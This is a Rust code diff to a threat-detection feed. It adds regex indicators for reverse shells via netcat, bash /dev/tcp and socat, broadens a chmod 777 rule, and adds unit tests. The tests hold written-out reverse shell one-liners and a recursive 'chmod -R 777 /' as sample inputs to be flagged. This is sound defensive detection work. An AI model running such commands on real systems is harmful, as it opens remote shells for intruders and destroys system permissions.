@@ -322,7 +322,10 @@ fn builtin_indicators() -> Vec<ThreatIndicator> {
     );
     add(
         ThreatType::MaliciousCommand,
-        "chmod 777",
+        // Regex (not a literal) so it still matches when flags sit between the
+        // verb and the mode, e.g. `chmod -R 777 /` — the old "chmod 777" literal
+        // missed those.
+        "regex:(?i)chmod\\s+.*777",
         "high",
         "Dangerous permissions, world-readable/writable/executable",
     );
@@ -337,6 +340,25 @@ fn builtin_indicators() -> Vec<ThreatIndicator> {
         "regex:wget\\s+.*\\|\\s*bash",
         "critical",
         "Remote code execution, piping wget output to bash",
+    );
+    add(
+        ThreatType::MaliciousCommand,
+        // -e and -c both make netcat run a program (a shell) on connect.
+        "regex:(?i)\\b(nc|ncat|netcat)\\b.*\\s-[ec]\\b",
+        "critical",
+        "Reverse shell, netcat with -e/-c executes a shell on connect",
+    );
+    add(
+        ThreatType::MaliciousCommand,
+        "regex:/dev/tcp/",
+        "critical",
+        "Reverse shell, bash redirection to /dev/tcp",
+    );
+    add(
+        ThreatType::MaliciousCommand,
+        "regex:(?i)\\bsocat\\b.*exec",
+        "critical",
+        "Reverse shell, socat with EXEC spawns a process on connect",
     );
 
     // ── Data Exfiltration ──
@@ -603,5 +625,40 @@ mod toml_tests {
     #[test]
     fn empty_document_yields_no_indicators() {
         assert!(ThreatFeed::indicators_from_toml("").unwrap().is_empty());
+    }
+}
+
+#[cfg(test)]
+mod builtin_command_tests {
+    use super::*;
+
+    #[test]
+    fn flags_recursive_chmod_and_reverse_shells() {
+        let feed = ThreatFeed::with_builtin_indicators();
+        for cmd in [
+            "chmod -R 777 /",                              // flags between verb and mode
+            "chmod 777 /etc/hosts",                        // plain form still matches
+            "nc -e /bin/sh 10.0.0.1 4444",                 // netcat reverse shell (-e)
+            "nc -c /bin/sh 10.0.0.1 4444",                 // netcat reverse shell (-c)
+            "ncat -e /bin/bash 10.0.0.1 4444",             // ncat variant
+            "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",      // bash /dev/tcp reverse shell
+            "socat TCP:10.0.0.1:4444 EXEC:/bin/bash",      // socat EXEC reverse shell
+        ] {
+            assert!(
+                !feed.check_threats(cmd).is_empty(),
+                "expected a threat match for: {cmd}"
+            );
+        }
+    }
+
+    #[test]
+    fn does_not_flag_benign_commands() {
+        let feed = ThreatFeed::with_builtin_indicators();
+        for cmd in ["echo hello", "ls -la", "chmod +x build.sh", "cat README.md"] {
+            assert!(
+                feed.check_threats(cmd).is_empty(),
+                "false positive on benign command: {cmd}"
+            );
+        }
     }
 }
